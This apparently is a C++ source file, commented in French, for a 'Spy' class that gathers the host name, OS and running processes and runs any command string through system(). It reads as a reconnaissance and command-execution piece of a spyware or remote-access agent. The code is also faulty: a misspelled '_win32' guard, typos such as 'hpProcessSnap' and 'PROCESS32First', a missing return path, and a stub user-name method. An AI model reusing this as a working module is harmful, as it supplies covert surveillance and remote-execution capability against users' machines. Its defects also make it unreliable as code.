#include "../headers/Spy.hpp"

/**
 * Méthode pour récupérer le nom de l'ordinateur
 */
std::string Spy::getComputerName(){
#ifdef _WIN32
    // Création d'un tableau pour stocker le nom de l'ordinateur
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);

        // Utilisation de l'API Windows pour obtenir le nom de l'ordinateur
        if(GetComputerName(computerName, &size)){
            return std::string(computerName);
        }
#else
    // Création d'un tableau pour stocker le nom de l'ordinateur
    char hostname[1024];
    hostname[1023] = '\0';

    // Utilisation de l'API Unix pour obtenir le nom de l'ordinateur
    gethostname(hostname, 1023);
    return std::string(hostname);
#endif
}


/**
 * Méthode pour récupérer le système d'exploitation
 */
std::string Spy::getOS(){
#ifdef _WIN32
    // Si nous sommes sur Windows, retourne simplement "Windows"
        return "Windows";
#else
    // Sur Unix, utilise l'API Unix pour obtenir le nom du système d'exploitation
    struct utsname unameData;
    if(uname(&unameData) != -1){
        return std::string(unameData.sysname);
    }
    return "Unknown";
#endif
}


/**
 * Méthode pour récupérer le nom d'utilisateur
 */
std::string Spy::getUserName(){
    // TODOO
    return "Useeeer name";
}


/**
 * Méthode pour récupérer la liste des processus en cours d'exécution
 */
std::vector<std::string> Spy::getProcessesList(){
    // Création d'un vecteur pour stocker la liste des processus
    std::vector<std::string> processList;

#ifdef _win32
    // Sur Windows, utilise l'API Windows pour obtenir la liste des processus
        HANDLE hProcessSnap;
        hpProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if(hProcessSnap == INVALID_HANDLE_VALUE){
            std::cerr << "CreateToolhelp32Snapshot failed" << std::endl;
            return processList;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (PROCESS32First(hProcessSnap, &pe32)){
            do{
                processList.push_back(pe32.szExeFile);
            }while(Process32Next(hProcessSnap, &pe32));
        }

        CloseHandle(hProcessSnap);
#else
    // Sur Unix, utilise l'API Unix pour obtenir la liste des processus
    DIR *dir;
    struct dirent *entry;
    if ((dir = opendir("/proc")) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR && std::isdigit(entry->d_name[0])) {
                std::string pid = entry->d_name;
                std::string cmdpath = std::string("/proc/") + pid + "/comm";
                std::ifstream cmdfile(cmdpath);
                std::string cmdline;
                if (std::getline(cmdfile, cmdline)) {
                    processList.push_back(cmdline);
                }
            }
        }
        closedir(dir);
    }
#endif

    // Retourne la liste des processus
    return processList;
}


/**
 * Méthode pour exécuter une commande système
 */
void Spy::executeCommand(const std::string& command) {
    // Exécute la commande système et stocke le code de retour
    int result = system(command.c_str());

    // Si le code de retour n'est pas 0, affiche une erreur
    if (result != 0) {
        std::cout << "Command failed with return code: " << result << std::endl;
    }
}